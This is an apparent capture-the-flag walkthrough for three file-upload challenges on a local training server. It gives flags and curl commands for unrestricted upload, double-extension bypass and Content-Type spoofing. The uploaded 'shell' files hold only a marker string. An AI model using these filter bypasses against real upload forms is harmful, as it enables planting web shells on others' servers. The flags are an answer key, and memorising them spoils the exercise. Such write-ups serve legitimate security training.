# File Upload Walkthroughs

## Challenge 1: Unrestricted Upload (Easy — 100pts)
**Flag:** `FLAG{unr3stricted_upl0ad}`

### Solution
Create a file `shell.php` with content `PHANTOM_SHELL` and upload it. No restrictions.
```bash
echo "PHANTOM_SHELL" > shell.php
curl -F "file=@shell.php" http://localhost:8080/challenges/upload/basic
```

---

## Challenge 2: Extension Filter Bypass (Medium — 200pts)
**Flag:** `FLAG{ext3nsion_f1lter_byp4ss}`

### Solution — double extension:
```bash
echo "PHANTOM_SHELL" > shell.php.jpg
curl -F "file=@shell.php.jpg" http://localhost:8080/challenges/upload/filtered
```
The filter only checks the LAST extension (.jpg is allowed), but the filename still contains .php.

---

## Challenge 3: Content-Type Bypass (Hard — 300pts)
**Flag:** `FLAG{c0ntent_typ3_byp4ss}`

### Solution
```bash
echo '<?php echo "PHANTOM_SHELL"; ?>' > shell.php.jpg
curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:8080/challenges/upload/content-type
```
The `-F "file=@shell.php.jpg;type=image/jpeg"` sets the Content-Type to image/jpeg while the file contains PHP code. Both checks pass.
